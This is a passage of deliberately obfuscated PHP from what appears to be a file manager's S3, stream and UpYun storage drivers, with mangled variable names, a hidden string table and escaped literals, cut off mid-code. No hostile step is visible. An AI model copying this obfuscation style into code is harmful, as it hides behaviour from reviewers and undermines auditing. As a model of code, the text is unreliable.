Cache::set(self::QUEUE_LENGTH, count($‰ïŞ–ÙÉ), $ îï›É‚); Cache::set(self::QUEUE_DATA, $‰ïŞ–ÙÉ, $ îï›É‚); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto dá¦íŠÚ”Æ; BùËÅÌÇœ¿: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($„ÛËÁÁ’) { parent::__construct($„ÛËÁÁ’); } public function uploadFormData($õÁßÖ«Ú, $Õå‘œ¨ö = 3600) { $©ÂÎ³¹ =& $_SERVER[ò«¥Ê‡å]; $äì­ğÅ = $©ÂÎ³¹[215]; $¤ÈŸáª½ = $©ÂÎ³¹[255]; $òÜş³ÕÏ = $©ÂÎ³¹[62]; $±íóŒ¶ = gmdate($©ÂÎ³¹[256]); $¤¹Î‰Í÷ = gmdate($©ÂÎ³¹[257]); $ÛÖô´‹½ = $©ÂÎ³¹[258]; $•ĞÉû‚¯ = $Õå‘œ¨ö . $©ÂÎ³¹[12]; $¬¨»®Û¶ = $©ÂÎ³¹[259]; $ê²ëÍå× = array($this->accessKey, $¤¹Î‰Í÷, $this->region, $òÜş³ÕÏ, $ÛÖô´‹½); $­‘ßì±‡ = implode($©ÂÎ³¹[8], $ê²ëÍå×); $Öà¯‡£ş = array($©ÂÎ³¹[260] => gmdate($©ÂÎ³¹[1372], strtotime($©ÂÎ³¹[262])), $©ÂÎ³¹[263] => array(array($©ÂÎ³¹[264] => $this->bucket), array($©ÂÎ³¹[265] => $äì­ğÅ), array($©ÂÎ³¹[266], $©ÂÎ³¹[267], $©ÂÎ³¹[12]), array($©ÂÎ³¹[266], $©ÂÎ³¹[268], $©ÂÎ³¹[12]), array($©ÂÎ³¹[266], $©ÂÎ³¹[269], $©ÂÎ³¹[12]), array($©ÂÎ³¹[270] => $¬¨»®Û¶), array($©ÂÎ³¹[271] => $­‘ßì±‡), array($©ÂÎ³¹[272] => $¤ÈŸáª½), array($©ÂÎ³¹[273] => $±íóŒ¶), array($©ÂÎ³¹[274] => $•ĞÉû‚¯))); $Ğ¸”÷÷ù = base64_encode(json_encode($Öà¯‡£ş)); $Œ‹È¿Ù = hash_hmac($©ÂÎ³¹[275], $¤¹Î‰Í÷, $©ÂÎ³¹[276] . $this->secret, !0); $’à¾¬§„ = hash_hmac($©ÂÎ³¹[275], $this->region, $Œ‹È¿Ù, !0); $¼è¸Êà€ = hash_hmac($©ÂÎ³¹[275], $òÜş³ÕÏ, $’à¾¬§„, !0); $ÍÃ¬Ÿ£« = hash_hmac($©ÂÎ³¹[275], $ÛÖô´‹½, $¼è¸Êà€, !0); $¯“âä­© = hash_hmac($©ÂÎ³¹[275], $Ğ¸”÷÷ù, $ÍÃ¬Ÿ£«); $å¸Ùà©À = array($©ÂÎ³¹[232] => $©ÂÎ³¹[12], $©ÂÎ³¹[277] => $©ÂÎ³¹[12], $©ÂÎ³¹[265] => $äì­ğÅ, $©ÂÎ³¹[270] => $¬¨»®Û¶, $©ÂÎ³¹[278] => $Ğ¸”÷÷ù, $©ÂÎ³¹[279] => $­‘ßì±‡, $©ÂÎ³¹[280] => $¤ÈŸáª½, $©ÂÎ³¹[281] => $±íóŒ¶, $©ÂÎ³¹[282] => $•ĞÉû‚¯, $©ÂÎ³¹[283] => $¯“âä­©, $©ÂÎ³¹[198] => $this->getHost()); return $å¸Ùà©À; } public function multiUploadFormData($á™Ç¼›Ã, $„Ï‡é = 3600) { $Àáè¿–Ï =& $_SERVER[ò«¥Ê‡å]; $ã¤·ı¥Ş = gmdate($Àáè¿–Ï[1477]); $Åë¿×íÄ = array(); $óÖË¤ = $this->client->getUploadId($this->bucket, $á™Ç¼›Ã, $Åë¿×íÄ); if (!$óÖË¤) { return !1; } return array($Àáè¿–Ï[240] => $óÖË¤, $Àáè¿–Ï[198] => $this->getHost() . $Àáè¿–Ï[8] . $this->pathEncode($á™Ç¼›Ã), $Àáè¿–Ï[241] => $ã¤·ı¥Ş, $Àáè¿–Ï[96] => $á™Ç¼›Ã); } public function multiUploadAuthData($é­ßÚÈ˜, $‰¿Ï³›Ö = array()) { $Æ¡Ê³Ğñ =& $_SERVER[ò«¥Ê‡å]; $û¹Ÿ‰Õü = isset($‰¿Ï³›Ö[$Æ¡Ê³Ğñ[177]]) ? $‰¿Ï³›Ö[$Æ¡Ê³Ğñ[177]] : $Æ¡Ê³Ğñ[12]; $°ÓĞ•û = $‰¿Ï³›Ö[$Æ¡Ê³Ğñ[96]]; unset($‰¿Ï³›Ö[$Æ¡Ê³Ğñ[96]]); if (isset($‰¿Ï³›Ö[$Æ¡Ê³Ğñ[242]])) { return $this->listUploadParts($°ÓĞ•û, $‰¿Ï³›Ö); } $ºá‚ùÄ‡ = array(); if (isset($‰¿Ï³›Ö[$Æ¡Ê³Ğñ[1478]])) { $ºá‚ùÄ‡[$Æ¡Ê³Ğñ[1479]] = $‰¿Ï³›Ö[$Æ¡Ê³Ğñ[1478]]; } $×Â•€”ş = explode($Æ¡Ê³Ğñ[200], $this->getHost()); $ÇòÅ³ë = array($Æ¡Ê³Ğñ[1480] => $×Â•€”ş[1], $Æ¡Ê³Ğñ[1481] => $Æ¡Ê³Ğñ[12], $Æ¡Ê³Ğñ[232] => $Æ¡Ê³Ğñ[122], $Æ¡Ê³Ğñ[277] => $‰¿Ï³›Ö[$Æ¡Ê³Ğñ[78]]); $ŒêøË„ = $Æ¡Ê³Ğñ[245]; $ ×«ü…İ = $Æ¡Ê³Ğñ[8] . $this->pathEncode($°ÓĞ•û) . $û¹Ÿ‰Õü; $ğ²öö§ = $this->client->__getSignatureV4($ºá‚ùÄ‡, $ÇòÅ³ë, $ŒêøË„, $ ×«ü…İ); if (strpos($û¹Ÿ‰Õü, $Æ¡Ê³Ğñ[244]) === 0) { if (isset($ºá‚ùÄ‡[$Æ¡Ê³Ğñ[1479]])) { $ ¶éÀğô = $ºá‚ùÄ‡[$Æ¡Ê³Ğñ[1479]]; } else { if (isset($ğ²öö§[$Æ¡Ê³Ğñ[1479]])) { $ ¶éÀğô = $ğ²öö§[$Æ¡Ê³Ğñ[1479]]; } else { $ ¶éÀğô = hash($Æ¡Ê³Ğñ[275], $Æ¡Ê³Ğñ[12]); } } return array($Æ¡Ê³Ğñ[251] => $ğ²öö§[$Æ¡Ê³Ğñ[251]], $Æ¡Ê³Ğñ[1479] => $ ¶éÀğô, $Æ¡Ê³Ğñ[241] => $ğ²öö§[$Æ¡Ê³Ğñ[1482]]); } return $ğ²öö§[$Æ¡Ê³Ğñ[251]]; } public function listUploadParts($‰©Şù°, $Šçé’Ó = array()) { $ÖÛ¦Ùí† =& $_SERVER[ò«¥Ê‡å]; $áÃò ¯° = str_replace($ÖÛ¦Ùí†[252], $ÖÛ¦Ùí†[12], $Šçé’Ó[$ÖÛ¦Ùí†[177]]); $‚×Š­Ÿ = $this->client->listParts($this->bucket, $‰©Şù°, $áÃò ¯°); if (!$‚×Š­Ÿ) { return !1; } $çğ¤«úÄ = $ÖÛ¦Ùí†[1483]; foreach ($‚×Š­Ÿ as $áº½‘Æ) { $çğ¤«úÄ .= $ÖÛ¦Ùí†[1484] . "\74\120\x61\162\164\x4e\165\x6d\142\145\162\x3e{$áº½‘Æ[$ÖÛ¦Ùí†[1440]]}\74\x2f\120\x61\x72\x74\x4e\x75\155\142\x65\162\x3e\12" . "\74\x45\x54\141\x67\76{$áº½‘Æ[$ÖÛ¦Ùí†[1441]]}\74\57\x45\x54\141\x67\x3e\xa" . $ÖÛ¦Ùí†[1485]; } $çğ¤«úÄ .= $ÖÛ¦Ùí†[1486]; $§ìİŠî™ = array(); $•İÚ£º’ = explode($ÖÛ¦Ùí†[200], $this->getHost()); $£úÒ®Ç = array($ÖÛ¦Ùí†[1480] => $•İÚ£º’[1], $ÖÛ¦Ùí†[232] => $ÖÛ¦Ùí†[122], $ÖÛ¦Ùí†[277] => strlen($çğ¤«úÄ)); $–Ú“¤Œó = $ÖÛ¦Ùí†[243]; $Àçù‘üë = $ÖÛ¦Ùí†[8] . $this->pathEncode($‰©Şù°) . $Šçé’Ó[$ÖÛ¦Ùí†[177]]; $ÇĞ»áÕ´ = $this->client->__getSignatureV4($§ìİŠî™, $£úÒ®Ç, $–Ú“¤Œó, $Àçù‘üë, $çğ¤«úÄ); return array($ÖÛ¦Ùí†[251] => $ÇĞ»áÕ´[$ÖÛ¦Ùí†[251]], $ÖÛ¦Ùí†[241] => $ÇĞ»áÕ´[$ÖÛ¦Ùí†[1482]], $ÖÛ¦Ùí†[253] => $‚×Š­Ÿ, $ÖÛ¦Ùí†[1479] => $ÇĞ»áÕ´[$ÖÛ¦Ùí†[1479]]); } public function link($ÒşÏò–“, $áÑüÎ¶Ğ = array()) { return parent::link($ÒşÏò–“, $áÑüÎ¶Ğ); } public function fileOut($¤«ÇÒ¨, $äúœ¸‚ø = false, $šàÀ§Ó = false, $ŞºŠ¦ø± = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ò«¥Ê‡å][1487])) { return parent::fileOutServer($¤«ÇÒ¨, $äúœ¸‚ø, $šàÀ§Ó, $ŞºŠ¦ø±); } parent::fileOut($¤«ÇÒ¨, $äúœ¸‚ø, $šàÀ§Ó, $ŞºŠ¦ø±); } public function fileOutImage($ÔÂ²¢ˆ¬, $µ¨¡¢¾õ = 250) { if (strstr($this->endpoint, $_SERVER[ò«¥Ê‡å][1487])) { return parent::fileOutImageServer($ÔÂ²¢ˆ¬, $µ¨¡¢¾õ); } parent::fileOutImage($ÔÂ²¢ˆ¬, $µ¨¡¢¾õ); } public function fileOutLink($ŸŞ®à’Ú) { $ï«¬Ğ =& $_SERVER[ò«¥Ê‡å]; if (substr($ŸŞ®à’Ú, 0, 7) == $ï«¬Ğ[1378]) { $ŸŞ®à’Ú = $ï«¬Ğ[1379] . substr($ŸŞ®à’Ú, 7); } header($ï«¬Ğ[164] . $ŸŞ®à’Ú); die; } public function getHost() { $œÏ€Ğ— =& $_SERVER[ò«¥Ê‡å]; $±ê“àÜ = str_rtrim(parent::getHost(), $œÏ€Ğ—[8] . $this->bucket); $±ê“àÜ = explode($œÏ€Ğ—[200], $±ê“àÜ); return $±ê“àÜ[0] . $œÏ€Ğ—[200] . $this->bucket . $œÏ€Ğ—[10] . $±ê“àÜ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($‘ê½âĞÍ, $éùŠÁ‰ = 0) { parent::__construct(); $this->source = $‘ê½âĞÍ; $this->sourceSize = $éùŠÁ‰; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($»µ´¦ñ = false) { return $this->sourceSize; } public function getContent($¨Ë…¼€ = false) { return $this->fileSubstr($¨Ë…¼€, 0, $this->sourceSize); } public function fileSubstr($ûèÌ˜ü† = false, $º¾ÇÙÊ‘ = 0, $éï¦ïŞ = 0) { if (!$éï¦ïŞ) { $éï¦ïŞ = $this->sourceSize; } $¶Õ²œğ¿ = $this->sourceSize - $º¾ÇÙÊ‘; if ($éï¦ïŞ >= $¶Õ²œğ¿) { $éï¦ïŞ = $¶Õ²œğ¿; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $º¾ÇÙÊ‘, $éï¦ïŞ); } if ($this->sourceType == self::TYPE_FILE) { if ($éï¦ïŞ <= 0) { return $_SERVER[ò«¥Ê‡å][12]; } $¢û³å = ftell($this->source); fseek_64($this->source, $¢û³å + $º¾ÇÙÊ‘); $ª…Áª†‚ = @fread($this->source, $éï¦ïŞ); fseek_64($this->source, $¢û³å); return $ª…Áª†‚; } } public function hashMd5($¯šõÆ¥ = false) { return md5($this->getContent()); } public static function hash($ïçÒ‘‘Ø, $ÚåÀÛ¹ = 0) { $öÈ©èçí = new PathDriverStream($ïçÒ‘‘Ø, $ÚåÀÛ¹); return $öÈ©èçí->hashSimple($ïçÒ‘‘Ø); } public static function md5($æö¶’, $—¥‹ùŠ = 0) { $¹ìòæş = new PathDriverStream($æö¶’, $—¥‹ùŠ); return $¹ìòæş->hashMd5($æö¶’); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\x2f\x2f\x76\x30\56\141\x70\151\56\165\x70\x79\165\x6e\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($©ŸìÕÕ–) { parent::__construct(); $this->_init($©ŸìÕÕ–); } public function _init($±ó’ßúÔ) { $ÁÌêé´ =& $_SERVER[ò«¥Ê‡å]; foreach ($±ó’ßúÔ as $ÍãŠ¿“ó => $¤Ò´ëö¢) { if (isset($this->{$ÍãŠ¿“ó})) { $this->{$ÍãŠ¿“ó} = $¤Ò´ëö¢; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ÁÌêé´[1488] . LNG($ÁÌêé´[1420])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($“ßÖ†ªû, $ıú¹šÑ = "\x47\105\x54") { $ıÒï¸ñ– =& $_SERVER[ò«¥Ê‡å]; $°îÈİğ = gmdate($ıÒï¸ñ–[1453]); $£ïà”‘ó = base64_encode(hash_hmac($ıÒï¸ñ–[1489], "{$ıú¹šÑ}\x26{$“ßÖ†ªû}\x26{$°îÈİğ}", md5("{$this->userpass}"), !0)); $ñŞ¬Ò”Ò = array("\x41\165\x74\150\157\162\x69\x7a\141\164\x69\x6f\x6e\x3a\x55\x50\131\125\x4e\40{$this->username}\x3a{$£ïà”‘ó}", "\x44\x61\x74\145\x3a{$°îÈİğ}"); return $ñŞ¬Ò”Ò; } public function ussRequest($®Ö«ùÖ, $ğ–²¥ÙĞ = "\x47\105\x54", $†Ï§°©– = false, $àêÔÅö‰ = false, $µÈ¿‰‹¾ = false) { $¶Áõˆ®Š =& $_SERVER[ò«¥Ê‡å]; $®Ö«ùÖ = trim($®Ö«ùÖ, $¶Áõˆ®Š[8]); $ïÂÎî´Û = "\57{$this->bucket}\x2f{$®Ö«ùÖ}"; $¨©‹ ï = $this->ussHeaders($ïÂÎî´Û, $ğ–²¥ÙĞ); if ($àêÔÅö‰) { $¨©‹ ï = array_merge($¨©‹ ï, $àêÔÅö‰); } $ÒËù¥Ö = url_request($this->endpoint . $ïÂÎî´Û, $ğ–²¥ÙĞ, $†Ï§°©–, $¨©‹ ï, $µÈ¿‰‹¾); if (!$ÒËù¥Ö) { return array($¶Áõˆ®Š[1259] => !1, $¶Áõˆ®Š[1249] => $¶Áõˆ®Š[1490]); } if (strtolower($ğ–²¥ÙĞ) == $¶Áõˆ®Š[213] || in_array($ÒËù¥Ö[$¶Áõˆ®Š[1259]], array($¶Áõˆ®Š[259], $¶Áõˆ®Š[1491]))) { $†Ï§°©– = $ÒËù¥Ö[$¶Áõˆ®Š[1492]]; } else { $†Ï§°©– = json_decode($ÒËù¥Ö[$¶Áõˆ®Š[1249]], !0); if (!$†Ï§°©–) { $†Ï§°©– = $ÒËù¥Ö[$¶Áõˆ®Š[1249]]; } else { if (!$ÒËù¥Ö[$¶Áõˆ®Š[789]] && isset($†Ï§°©–[$¶Áõˆ®Š[1493]])) { $†Ï§°©– = $†Ï§°©–[$¶Áõˆ®Š[1493]]; } } } return array($¶Áõˆ®Š[1259] => $ÒËù¥Ö[$¶Áõˆ®Š[789]], $¶Áõˆ®Š[1249] => $†Ï§°©–); } public function mkfile($‰¢Ë˜…, $çµãûô = '', $ûÓî™œÜ = REPEAT_RENAME) { if ($this->setContent($‰¢Ë˜…, $çµãûô)) { return $this->getPathOuter($‰¢Ë˜…); } return !1; } public function mkdir($åïï½¯ä, $¾ùëŞšÃ = REPEAT_SKIP) { $æ¦³úğ¹ =& $_SERVER[ò«¥Ê‡å]; $¤È—¢™Ê = trim($åïï½¯ä, $æ¦³úğ¹[8]); if ($this->_isFolder($¤È—¢™Ê)) { return $this->getPathOuter($¤È—¢™Ê); } $ÕĞˆ¸ä‘ = array($æ¦³úğ¹[1494]); $¾Ëòå»‰ = $this->ussRequest($¤È—¢™Ê, $æ¦³úğ¹[243], !1, $ÕĞˆ¸ä‘); return $¾Ëòå»‰[$æ¦³úğ¹[1259]] ? $this->getPathOuter($¤È—¢™Ê) : !1; } public function copyFile($ßàô‘ùö, $„†Ş®ÛÌ) { $ƒÒıê—ù =& $_SERVER[ò«¥Ê‡å]; $˜¢‹Å„Ò = array($ƒÒıê—ù[1495] . "\57{$this->bucket}\x2f{$ßàô‘ùö}", $ƒÒıê—ù[1496]); $¢ Èï‰ = $this->ussRequest($„†Ş®ÛÌ, $ƒÒıê—ù[245], !1, $˜¢‹Å„Ò); return $¢ Èï‰[$ƒÒıê—ù[1259]] ? !0 : $this->getPathOuter($„†Ş®ÛÌ); } public function moveFile($¢£²™ÓŒ, $À×Ã··¿) { $û¦µÇü =& $_SERVER[ò«¥Ê‡å]; $‹Âõ™‡Û = array($û¦µÇü[1497] . "\57{$this->bucket}\x2f{$¢£²™ÓŒ}", $û¦µÇü[1496]); $Ğ¹éğ‡Š = $this->ussRequest($À×Ã··¿, $û¦µÇü[245], !1, $‹Âõ™‡Û); return $Ğ¹éğ‡Š[$û¦µÇü[1259]] ? !0 : $this->getPathOuter($À×Ã··¿); } public function delFile($”ŸÆ½Åñ) { $í¬‚¶ì¹ =& $_SERVER[ò«¥Ê‡å]; $¥­»†Û˜ = $this->ussRequest($”ŸÆ½Åñ, $í¬‚¶ì¹[1498]); return $¥­»†Û˜[$í¬‚¶ì¹[1259]] ? !0 : !1; } public function delFolder($êèŸêÑ•) { $Ò©ÖØÉ =& $_SERVER[ò«¥Ê‡å]; if (!$this->exist($êèŸêÑ•)) { return !0; } $this->listItemCache = !1; $ºã‡¹—Á = $×Å«îçæ = array(); $this->fileList($êèŸêÑ•, $ºã‡¹—Á, $×Å«îçæ, !0); $this->listItemCache = !0; foreach ($×Å«îçæ as $ÖêÔ‰½õ) { $®œ¾‹Å = $this->ussRequest($ÖêÔ‰½õ[$Ò©ÖØÉ[32]], $Ò©ÖØÉ[1498]); if (!$®œ¾‹Å[$Ò©ÖØÉ[1259]]) { return !1; } } foreach ($ºã‡¹—Á as $ëá­ö°«) { $®œ¾‹Å = $this->ussRequest($ëá­ö°«, $Ò©ÖØÉ[1498]); if (!$®œ¾‹Å[$Ò©ÖØÉ[1259]]) { return !1; } } $®œ¾‹Å = $this->ussRequest($êèŸêÑ•, $Ò©ÖØÉ[1498]); return $®œ¾‹Å[$Ò©ÖØÉ[1259]]; } public function rename($é…‰±¶‹, $‘ª€û¹) { if ($this->isFile($é…‰±¶‹)) { $‘ª€û¹ = get_path_father($é…‰±¶‹) . $‘ª€û¹; return $this->moveFile($é…‰±¶‹, $‘ª€û¹); } return $this->renameObject($é…‰±¶‹, $‘ª€û¹); } public function fileInfo($­š‡¬ú, $óü˜ï¼ö = false, $ôÜâ‘Üµ = array()) { $§ºûä =& $_SERVER[ò«¥Ê‡å]; $Öà¦Ú×Ï = array($§ºûä[32] => $this->pathThis($­š‡¬ú), $§ºûä[86] => $this->getPathOuter($§ºûä[8] . $­š‡¬ú), $§ºûä[33] => $§ºûä[216], $§ºûä[78] => isset($ôÜâ‘Üµ[$§ºûä[78]]) ? $ôÜâ‘Üµ[$§ºûä[78]] : 0, $§ºûä[177] => $this->ext($­š‡¬ú)); if ($óü˜ï¼ö) { return $Öà¦Ú×Ï; } $Öà¦Ú×Ï[$§ºûä[217]] = $Öà¦Ú×Ï[$§ºûä[87]] = 0; $Öà¦Ú×Ï[$§ºûä[218]] = $Öà¦Ú×Ï[$§ºûä[219]] = !0; if (empty($ôÜâ‘Üµ)) { $ôÜâ‘Üµ = $this->objectMeta($­š‡¬ú); if (!$ôÜâ‘Üµ) { return $Öà¦Ú×Ï; } } $Öà¦Ú×Ï[$§ºûä[217]] = intval($ôÜâ‘Üµ[$§ºûä[1499]]); $Öà¦Ú×Ï[$§ºûä[87]] = intval($ôÜâ‘Üµ[$§ºûä[1500]]); $Öà¦Ú×Ï[$§ºûä[78]] = $ôÜâ‘Üµ[$§ºûä[78]]; return $Öà¦Ú×Ï; } public function folderInfo($¥¡×ŒÅ, $Ğ†‹†ï = false) { $Í¸¨õ‡Ù =& $_SERVER[ò«¥Ê‡å]; $ˆ´¢¯°Ğ = array($Í¸¨õ‡Ù[32] => $this->pathThis($¥¡×ŒÅ), $Í¸¨õ‡Ù[86] => $this->getPathOuter($Í¸¨õ‡Ù[8] . $¥¡×ŒÅ), $Í¸¨õ‡Ù[33] => $Í¸¨õ‡Ù[77]); if ($Ğ†‹†ï) { return $ˆ´¢¯°Ğ; } $ˆ´¢¯°Ğ[$Í¸¨õ‡Ù[217]] = $ˆ´¢¯°Ğ[$Í¸¨õ‡Ù[87]] = 0; $ˆ´¢¯°Ğ[$Í¸¨õ‡Ù[218]] = $ˆ´¢¯°Ğ[$Í¸¨õ‡Ù[219]] = !0; if (empty($Ê††ÜØ)) { $Ê††ÜØ = $this->objectMeta($¥¡×ŒÅ); if (!$Ê††ÜØ) { return $ˆ´¢¯°Ğ; } } $ˆ´¢¯°Ğ[$Í¸¨õ‡Ù[217]] = intval($Ê††ÜØ[$Í¸¨õ‡Ù[1499]]); $ˆ´¢¯°Ğ[$Í¸¨õ‡Ù[87]] = intval($Ê††ÜØ[$Í¸¨õ‡Ù[1500]]); return $ˆ´¢¯°Ğ; } private function listObjs($ÉŒ½ãõÕ, $•½±¾Õ = 0, $ßÛÛÛĞ  = 1000) { $½Ìª™±Ë =& $_SERVER[ò«¥Ê‡å]; $¶š½ôï­ = array($½Ìª™±Ë[1501], $½Ìª™±Ë[1502] . $ßÛÛÛĞ ); if ($•½±¾Õ) { $¶š½ôï­[] = $½Ìª™±Ë[1503] . $•½±¾Õ; } $µÓÓ€“  = $this->ussRequest($ÉŒ½ãõÕ, $½Ìª™±Ë[247], !1, $¶š½ôï­); return !$µÓÓ€“ [$½Ìª™±Ë[1259]] ? !1 : $µÓÓ€“ [$½Ìª™±Ë[1249]]; } private function fileList($ Æş›¬ı, &$Á¤ğêóé, &$…Ù¬Ò½‹, $º¿ó­€ = false) { $Õç”ÚÇÀ =& $_SERVER[ò«¥Ê‡å]; $ıÃÎ§À = $Õç”ÚÇÀ[12]; $ôŒÖîûÖ = 1000; $ÉĞİ‡Çæ = rtrim($ Æş›¬ı, $Õç”ÚÇÀ[8]) . $Õç”ÚÇÀ[8]; while (!0) { check_abort(); $¢ÓËúùî = $this->listObjs($ Æş›¬ı, $ıÃÎ§À, $ôŒÖîûÖ); if (!$¢ÓËúùî) { return !1; } $ıÃÎ§À = isset($¢ÓËúùî[$Õç”ÚÇÀ[1504]]) ? $¢ÓËúùî[$Õç”ÚÇÀ[1504]] : $Õç”ÚÇÀ[12]; $½³üµ¼Ù = isset($¢ÓËúùî[$Õç”ÚÇÀ[1505]]) ? $¢ÓËúùî[$Õç”ÚÇÀ[1505]] : array(); foreach ($½³üµ¼Ù as $¢ş˜ë) { $«ÍÊ¬Ø = $¢ş˜ë[$Õç”ÚÇÀ[33]] == $Õç”ÚÇÀ[77] ? !0 : !1; $Ô ‚’Ê¹ = ltrim($ÉĞİ‡Çæ . $¢ş˜ë[$Õç”ÚÇÀ[32]], $Õç”ÚÇÀ[8]) . ($«ÍÊ¬Ø ? $Õç”ÚÇÀ[8] : $Õç”ÚÇÀ[12]); $Ô •„­ = array($Õç”ÚÇÀ[32] => $Ô ‚’Ê¹, $Õç”ÚÇÀ[33] => $«ÍÊ¬Ø ? $Õç”ÚÇÀ[77] : $Õç”ÚÇÀ[216], $Õç”ÚÇÀ[78] => $¢ş˜ë[$Õç”ÚÇÀ[383]], $Õç”ÚÇÀ[1500] => $¢ş˜ë[$Õç”ÚÇÀ[1506]]); $this->cacheMethodInfoSet($Ô ‚’Ê¹, $«ÍÊ¬Ø, $Ô •„­); if ($«ÍÊ¬Ø) { $Á¤ğêóé[] = $Ô ‚’Ê¹; if ($º¿ó­€) { $this->fileList($Ô ‚’Ê¹, $Á¤ğêóé, $…Ù¬Ò½‹, $º¿ó­€); } continue; } $…Ù¬Ò½‹[] = $Ô •„­; } if (count($½³üµ¼Ù) < $ôŒÖîûÖ) { break; } } $this->cacheMethodInfoSet($ Æş›¬ı, !0); } public function listPath($‘€ÂüõÚ, $ÏãÃ¡ÆÈ = false) { $àæÄ¤‹ =& $_SERVER[ò«¥Ê‡å]; $€úÁçÜö = $”Ê×¹¨ = array(); $this->fileList($‘€ÂüõÚ, $€úÁçÜö, $”Ê×¹¨); foreach ($€úÁçÜö as $İŞö½ñ¸ => $¥õÕÒü) { $€úÁçÜö[$İŞö½ñ¸] = $this->folderInfo($¥õÕÒü, $ÏãÃ¡ÆÈ); } foreach ($”Ê×¹¨ as $İŞö½ñ¸ => $¥õÕÒü) { $”Ê×¹¨[$İŞö½ñ¸] = $this->fileInfo($¥õÕÒü[$àæÄ¤‹[32]], $ÏãÃ¡ÆÈ, $¥õÕÒü); } return array($àæÄ¤‹[84] => $€úÁçÜö, $àæÄ¤‹[85] => $”Ê×¹¨); } public function has($úôì©‘, $ãüæ¿ä = false, $¿ú““— = true) { $¾íúóî´ =& $_SERVER[ò«¥Ê‡å]; $Ù¸üâ = $¾íúóî´[12]; $€çê¡ñÄ = 500; $£“¥¯¼ = 0; $¾—´¤¤ø = 0; $±á²¦·ì = rtrim($úôì©‘, $¾íúóî´[8]) . $¾íúóî´[8]; while (!0) { check_abort(); $ùŞ‚òµ = $this->listObjs($úôì©‘, $Ù¸üâ, $€çê¡ñÄ); if (!$ùŞ‚òµ) { return !1; } $Ù¸üâ = isset($ùŞ‚òµ[$¾íúóî´[1504]]) ? $ùŞ‚òµ[$¾íúóî´[1504]] : $¾íúóî´[12]; $¼¤×¸«Ë = isset($ùŞ‚òµ[$¾íúóî´[1505]]) ? $ùŞ‚òµ[$¾íúóî´[1505]] : array(); if (empty($¼¤×¸«Ë)) { break; } $ªçŒ±æš = array_filter($¼¤×¸«Ë, function ($¡¨§¤…í) { $ß¥”¢Øæ =& $_SERVER[ò«¥Ê‡å]; return $¡¨§¤…í[$ß¥”¢Øæ[33]] == $ß¥”¢Øæ[77]; }); $é°‡ê¢ = count($¼¤×¸«Ë); $ªçŒ±æš = count($ªçŒ±æš); $ÉÕ´àß = $é°‡ê¢ - $ªçŒ±æš; if ($ãüæ¿ä) { $¾—´¤¤ø += $ªçŒ±æš; $£“¥¯¼ += $ÉÕ´àß; if ($é°‡ê¢ < $€çê¡ñÄ) { break; } continue; } if ($¿ú““—) { if ($ÉÕ´àß) { return !0; } } else { if ($ªçŒ±æš) { return !0; } } if ($é°‡ê¢ < $€çê¡ñÄ) { break; } } if ($ãüæ¿ä) { return array($¾íúóî´[225] => $£“¥¯¼, $¾íúóî´[226] => $¾—´¤¤ø); } return !1; } public function listAll($ãñ»§¶·) { $Éİ“Í—Ş =& $_SERVER[ò«¥Ê‡å]; $Ë¡­‘¢¾ = $Ü‰åÁĞ– = array(); $this->fileList($ãñ»§¶·, $Ë¡­‘¢¾, $Ü‰åÁĞ–, !0); $»õß± Ü = array_to_keyvalue($Ü‰åÁĞ–, $Éİ“Í—Ş[32]); foreach ($Ë¡­‘¢¾ as $•ßµæö) { if (is_string($•ßµæö)) { $»õß± Ü[$•ßµæö] = array($Éİ“Í—Ş[78] => 0); } } return $this->listAllFiles($ãñ»§¶·, $»õß± Ü); } public function canRead($ŒœÇ¨™í) { return $this->exist($ŒœÇ¨™í) ? !0 : !1; } public function canWrite($”ÖÅà‰•) { return $this->exist($”ÖÅà‰•) ? !0 : !1; } public function getContent($‘»èˆ‡è) { return $this->fileSubstr($‘»èˆ‡è, 0, -1); } public function setContent($ÅŒÊÂÏ´, $ÎöÎ‡Ö¥ = '') { $§„±¶ğâ =& $_SERVER[ò«¥Ê‡å]; if (!$ÎöÎ‡Ö¥) { $¼Ûø’ = $this->ussRequest($ÅŒÊÂÏ´, $§„±¶ğâ[243]); return $¼Ûø’[$§„±¶ğâ[1259]]; } $Èšá¡öÏ = $this->tempFile($this->pathThis($ÅŒÊÂÏ´)); file_put_contents($Èšá¡öÏ, $ÎöÎ‡Ö¥); if ($this->upload($ÅŒÊÂÏ´, $Èšá¡öÏ)) { $this->tempFileRemve($Èšá¡öÏ); return !0; } return !1; } public function fileSubstr($üÀÆß¼•, $Š­ÍŞ‘, $ß«£Ö²ƒ) { $–¤Ï¦óÎ =& $_SERVER[ò«¥Ê‡å]; if (!($®³Ğ˜— = $this->link($üÀÆß¼•))) { return !1; } $Èœ¡»¿ = !1; if ($ß«£Ö²ƒ > 0) { $îóµê² = $Š­ÍŞ‘ + $ß«£Ö²ƒ - 1; $Èœ¡»¿ = array($–¤Ï¦óÎ[1467] . $Š­ÍŞ‘ . $–¤Ï¦óÎ[432] . $îóµê²); } $ÈÆ´Ÿóä = url_request($®³Ğ˜—, $–¤Ï¦óÎ[247], !1, $Èœ¡»¿); return $ÈÆ´Ÿóä[$–¤Ï¦óÎ[789]] ? $ÈÆ´Ÿóä[$–¤Ï¦óÎ[1249]] : !1; } public function upload($¹æ Öáé, $îüÀäŒº, $Û¦ŠÓôÔ = false, $Ş³ËŞ­Ë = REPEAT_REPLACE) { $œì—ıŒ™ =& $_SERVER[ò«¥Ê‡å]; $Ò½Ã†ğÈ = IO::size($îüÀäŒº); if ($Ò½Ã†ğÈ <= 1024 * 1024 * 200) { $šß¨Êğ¦ = array($œì—ıŒ™[1507] . $îüÀäŒº); $Åõıâô = 